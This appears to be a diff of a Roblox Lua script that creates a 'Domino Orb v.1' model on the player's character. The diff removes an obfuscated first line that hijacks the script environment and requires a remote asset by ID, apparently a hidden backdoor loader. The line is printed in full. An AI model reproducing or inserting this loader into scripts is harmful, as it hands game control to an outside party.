@@ -1,4 +1,3 @@
-local a=newproxy(true);getmetatable(a).__tostring=function()a=getfenv(3)end;pcall(warn,a);coroutine.resume(a.require(367979672))
 player = game.Players.LocalPlayer.Character
 m = Instance.new("Model") m.Parent = player m.Name = "Domino Orb v.1"
 p = Instance.new("Part") p.Parent = player["Domino Orb v.1"] p.Size = Vector3.new(1,1,1) p.Position = Vector3.new(0,20,0) p.Name = "Head"
